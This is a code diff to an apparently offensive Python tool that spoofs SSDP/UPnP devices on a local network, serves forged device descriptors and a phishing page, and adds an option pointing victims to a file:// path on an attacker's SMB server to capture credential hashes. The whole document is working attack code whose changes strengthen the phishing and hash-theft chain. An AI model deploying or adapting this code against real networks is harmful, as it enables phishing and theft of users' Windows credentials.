@@ -4,7 +4,9 @@ from multiprocessing import Process
 from string import Template
 from http.server import BaseHTTPRequestHandler
 from email.utils import formatdate
-import os,sys,re,argparse,socket,struct,time,re,socketserver;
+from time import sleep
+from ipaddress import ip_address
+import os,sys,re,argparse,socket,struct,time,re,socketserver,signal;
 
 banner = r'''
 ___________     .__.__    _________ _________________ __________
@@ -39,6 +41,9 @@ parser.add_argument('interface', type=str, help='Network interface to listen on.
 parser.add_argument('-p', '--port', type=str, help='Port for HTTP server. Defaults to 8888.', action='store')
 parser.add_argument('-t', '--template', type=str, help='Name of a folder in the templates directory. \
                      Defaults to "password-vault". This will determine xml and phishing pages used."', action='store')
+parser.add_argument('-s', '--smb', type=str, help='IP address of your SMB server. Defalts to the \
+                     primary address of the "interface" provided.', action='store')
+
 args = parser.parse_args()
 
 interface = args.interface
@@ -93,7 +98,6 @@ def MakeHTTPClass(deviceXML, serviceXML, phishPage):
                 self.end_headers()
                 self.wfile.write(deviceXML.encode())
             elif self.path == '/ssdp/service-desc.xml':
-                xmlFile = self.buildServiceXml()
                 self.send_response(200)
                 self.send_header('Content-type', 'application/xml')
                 self.end_headers()
@@ -118,7 +122,7 @@ def MakeHTTPClass(deviceXML, serviceXML, phishPage):
 
     return DeviceDescriptor 
 
-def get_ip(interface):
+def get_ip():
     try:
         localIp = re.findall(r'inet (.*?)/', os.popen('ip addr show ' + interface).read())[0]
         broadcast = re.findall(r'brd (.*?) ', os.popen('ip addr show ' + interface).read())[0]
@@ -126,6 +130,17 @@ def get_ip(interface):
         print(warnBox + "Could not get network interface info. Please check and try again.")
         sys.exit()
     return localIp
+
+def set_smb():
+    if args.smb:
+        if ip_address(args.smb):
+            smbServer = args.smb
+        else:
+            print("Sorry, that is not a valid IP address for your SMB server.")
+            sys.exit()
+    else:
+        smbServer = localIp
+    return(smbServer)
 
 def process_data(listener, data, address):
     (remoteIp,remotePort) = address
@@ -173,21 +188,31 @@ def buildServiceXML():
     xmlFile = template.substitute(variables)
     return xmlFile
 
-def buildPhish():
-    variables = {'localIp': localIp}
+def buildPhish(smbServer):
+    variables = {'smbServer': smbServer}
     fileIn = open(templateDir + '/present.html')
     template = Template(fileIn.read())
     phishPage = template.substitute(variables)
     return phishPage
 
-def serve_descriptor(deviceXML, serviceXML, phishPage):
-    print(okBox + "Serving device descriptor using {} at {} on port {}".format(interface, localIp, localPort))
+def serve_html(deviceXML, serviceXML, phishPage):
     HTTPClass = MakeHTTPClass(deviceXML, serviceXML, phishPage)
+    socketserver.TCPServer.allow_reuse_address = True
     descriptor = socketserver.TCPServer((localIp, localPort), HTTPClass)
     descriptor.serve_forever()
 
+def print_details(smbServer):
+    print("\n\n")
+    print("########################################")
+    print(okBox + "MSEARCH LISTENER:   {}.".format(interface))
+    print(okBox + "DEVICE DESCRIPTOR:  http://{}:{}/ssdp/device-desc.xml".format(localIp, localPort))
+    print(okBox + "SERVICE DESCRIPTOR: http://{}:{}/ssdp/service-desc.xml".format(localIp, localPort))
+    print(okBox + "PHISHING PAGE:      http://{}:{}/ssdp/present.html".format(localIp, localPort))
+    print(okBox + "SMB POINTER:        file://///{}/smb/hash.jpg".format(smbServer))
+    print("########################################")
+    print("\n\n")
+
 def listen_msearch():
-    print(okBox + "Listening for MSEARCH queries using {}.".format(interface))
     listener = SSDPListener(localIp, localPort)
     while True:
         data, address = listener.sock.recvfrom(1024)
@@ -196,12 +221,24 @@ def listen_msearch():
 
 def main():
     global localIp
-    localIp = get_ip(interface)
+    localIp = get_ip()
+    smbServer = set_smb()
     deviceXML = buildDeviceXML()
     serviceXML = buildServiceXML()
-    phishPage = buildPhish()
-    Process(target=serve_descriptor, args=(deviceXML, serviceXML, phishPage)).start()
-    listen_msearch()
+    phishPage = buildPhish(smbServer)
+    print_details(smbServer)
+    try:
+        webServer = Process(target=serve_html, args=(deviceXML, serviceXML, phishPage))
+        ssdpServer = Process(target=listen_msearch, args=())
+        webServer.start()
+        ssdpServer.start()
+        signal.pause()
+    except (KeyboardInterrupt, SystemExit):
+        print("\n" + warnBox + "Thanks for playing! Stopping threads and exiting...\n")
+        webServer.terminate()
+        ssdpServer.terminate()
+        sleep(5)
+        sys.exit()
     
 
 if __name__ == "__main__":
